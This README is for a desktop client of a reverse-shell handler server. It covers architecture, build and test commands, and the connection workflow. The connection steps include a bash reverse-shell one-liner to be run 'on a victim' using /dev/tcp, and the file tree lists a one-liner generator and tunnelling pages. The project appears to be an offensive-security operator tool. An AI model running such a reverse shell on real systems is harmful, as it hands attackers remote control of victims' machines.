# Platypus Desktop

Native (Wails v2) desktop client for [platypus-server](../). Operators install
this on their laptop, point it at any reachable server URL + secret, and get
a tabbed UI for sessions, terminals, file transfer, port forwarding, and
plain→encrypted upgrade.

The server stays a pure REST + WebSocket API — there is no embedded UI in
`platypus-server` anymore. Multiple desktops can connect to the same server.

## Architecture

| Layer | Tech | Notes |
|---|---|---|
| Shell | Wails v2 | Native window via webkit2gtk / WebView2 / WKWebView |
| UI | React 18 + Vite + TypeScript + antd 6 + xterm.js | |
| Glue | Wails JS↔Go bindings | Auto-generated under `frontend/wailsjs/` |
| Logic | Go (this module) | All HTTP, WebSocket, keychain, file IO |

The frontend never touches the network or the keychain directly — every
external interaction goes through `App.*` methods on the Go side. This keeps
secrets out of the WebView and lets us write proper Go tests against
`httptest.Server` for the entire API surface.

## Layout

```
desktop/
├── main.go                       # Wails entry — wires app.App into wails.Run
├── internal/
│   ├── api/         # HTTP client, /notify + /ws/:hash WebSocket clients
│   ├── app/         # Wails-bindable App struct (one method per UI action)
│   ├── keychain/    # zalando/go-keyring wrapper
│   └── profile/     # Saved server profiles (JSON file at user config dir)
├── frontend/
│   ├── src/
│   │   ├── App.tsx               # Tab container + connection routing
│   │   └── pages/
│   │       ├── Connect.tsx       # Pre-connection: profile CRUD, secret entry
│   │       ├── Sessions.tsx      # Active sessions table + live notify events
│   │       ├── Terminal.tsx      # xterm.js per session
│   │       ├── Listeners.tsx     # CRUD listeners + RaaS oneliner generator
│   │       ├── UpgradeModal.tsx  # Plain→Termite with progress bars
│   │       ├── Files.tsx         # Chunked upload/download
│   │       └── Tunnels.tsx       # pull/push/dynamic SOCKS5/internet
│   ├── wailsjs/                  # auto-generated; gitignored
│   └── package.json
└── wails.json
```

## Develop

```bash
make desktop-deps         # one-time: install Wails CLI + npm packages
make desktop-bindings     # any time you add/remove App methods on the Go side
make desktop-dev          # hot-reload dev mode
```

The `wails dev` command needs the system WebKit dev libs (webkit2gtk-4.1 on
Linux) — see `wails doctor` for the canonical list.

## Test

```bash
make desktop-test         # runs go test -race ./internal/...
```

The Go side is fully covered by httptest-driven tests. The React side relies
on TypeScript + Vite build for static checking; UI smoke testing is manual
in `wails dev` for now.

## Build

```bash
make desktop-build        # wails build -clean → desktop/build/bin/<name>
```

`wails build` produces a single ~10 MB native binary for the current
platform. Cross-platform builds need the appropriate toolchains; for
release-ready installers (DMG, MSI, AppImage) use `wails build` flags
documented at https://wails.io/docs/reference/cli.

## Connect to a server

1. Run the server and note the secret printed at startup
   (`./build/platypus-server` → "API secret: …").
2. Launch the desktop app.
3. **Add Profile**: name = "local", URL = `http://127.0.0.1:7331`, paste the
   secret. Save.
4. **Connect**. The app exchanges the secret for a Bearer token and switches
   to the Sessions tab.
5. Trigger a reverse shell on a victim:
   `bash -c 'bash -i >/dev/tcp/<server>/13337 0>&1'`
6. The session appears in the Sessions tab; click **Open Terminal** to
   interact, **Upgrade** to convert to encrypted, etc.

Secrets live in the OS keychain (Keychain on macOS, Credential Vault on
Windows, Secret Service on Linux). On headless Linux without
`secret-service`, profile creation will fail; we'll surface a clearer error
and add a fallback in a future iteration.

## Out of MVP scope

- Group dispatch UI (the `/api/v1/sessions/dispatch` endpoint exists but
  needs a multi-select session UI + result aggregation view).
- Directory listing in the file browser (server only exposes read/write/size).
- WebGL renderer for xterm (Wails WebView compatibility varies across
  platforms — using Canvas).
- Zmodem file transfer.
- OpenAPI-codegen client (waiting on swag annotations server-side).
- CI cross-platform desktop builds (manual `wails build` for now).
